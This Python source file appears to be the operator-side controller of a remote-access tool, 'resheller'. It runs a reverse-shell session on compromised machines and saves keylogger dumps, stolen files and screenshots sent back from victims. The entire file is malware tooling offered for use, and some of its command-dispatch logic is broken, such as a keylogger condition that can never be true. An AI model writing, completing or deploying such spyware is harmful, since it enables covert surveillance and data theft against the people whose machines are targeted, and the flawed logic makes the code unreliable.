#!/usr/bin/env python3
"""shell"""
from base64 import b64decode
from os import path
from pathlib import Path
from time import strftime

from lib.pipe import SafeSocket
from lib.stdout import COLOR
from src.server.ps1 import Ps1


class Shell:
    """The shell and commands to send to the client"""

    def __init__(self, ips: list, targets: list, sessions: int) -> None:
        self.ips = ips
        self.targets = targets
        self.ipv4, _ = ips[sessions]
        self.target = targets[sessions]
        self.time = strftime("%H.%M.%S")
        self.safe_sock = SafeSocket(self.target)
        self.ps1 = Ps1(self.safe_sock)

    @staticmethod
    def make_dir(cmd: str) -> str:
        """Make a directory to store data for corresponding command

        :param cmd: The command the directory will be made for
        :return:    The directory that was created
        """
        date = strftime("%Y.%m.%d")
        _dir = path.join(str(Path.home()), ".resheller", date, cmd)
        if not path.isdir(_dir):
            Path(_dir).mkdir(parents=True, exist_ok=True)
        return _dir

    def keylogger(self, cmd: str) -> None:
        """Dump the key-log to a file or print it to the terminal

        :param cmd: Send the option to `dump` or `print`to the client
        """
        log = self.safe_sock.recv()
        if cmd == "dump":
            _dir = self.make_dir("logs")
            logs = path.join(_dir, f"keylog_{self.time}.txt")
            if log[:3] == "[!]":
                COLOR.b_red.print(log)
            else:
                with open(logs, "w") as log_file:
                    log_file.write(log)
                COLOR.grn.print(f"Saved {logs}\n")
        elif cmd == "print":
            print(log)

    def download_file(self, cmd: str) -> None:
        """Organize the downloaded file and subsequent files into the
        download directory

        :param cmd: The name of the item downloaded
        """
        count = 1
        _dir = self.make_dir("downloads")
        download = path.join(_dir, cmd)
        payload = self.safe_sock.recv()
        if path.isfile(download):
            while True:
                if path.isfile(f"{download}.{count}"):
                    count += 1
                else:
                    download = f"{download}.{count}"
                    break
        with open(download, "wb") as file:
            file.write(b64decode(payload))
        COLOR.grn.print(f"Saved {download}\n")

    def screenshot(self) -> None:
        """Save the screenshot retrieved from the target"""
        _dir = self.make_dir("screenshots")
        image = path.join(_dir, f"screenshot_{self.time}.png")
        payload = self.safe_sock.recv()
        payload = b64decode(payload)
        if payload[:3] == "[!]":
            COLOR.b_red.print(payload)
        else:
            with open(image, "wb") as screenshot:
                screenshot.write(payload)
                screenshot.close()
            COLOR.grn.print(f"Saved {image}\n")

    def print_stdout(self) -> None:
        """Print the stdout of sufficient command returned from the
        client
        """
        stdout = self.safe_sock.recv()
        if stdout[:3] == "[+]":
            if len(stdout) > 3:
                stdout = COLOR.b_grn.get(f"{stdout}\n")
            else:
                return
        elif stdout[:3] == "[!]":
            stdout = COLOR.b_red.get(f"{stdout}\n")
        elif stdout[:3] == "[*]":
            stdout = COLOR.ylw.get(f"{stdout}\n")
        print(stdout)
        return

    def exit_shell(self) -> None:
        """Exit the shell and remove the collected targets and ips from
        the list
        """
        self.target.close()
        self.targets.remove(self.target)
        self.ips.remove(self.ipv4)

    def shell(self) -> None:
        """The client's direct counterpart, the shell the the reverse
        shell interacts with
        """
        while True:
            cmd = self.ps1.prompt()
            self.safe_sock.send(cmd)
            if cmd == "screenshot":
                self.screenshot()
            elif cmd == "keylogger" and len(cmd) > 9:
                self.keylogger(cmd[:9])
            elif cmd[:8] == "download":
                self.download_file(cmd[:9])
            elif cmd in ("quit", "exit"):
                if cmd == "exit":
                    self.exit_shell()
                break
            else:
                self.print_stdout()
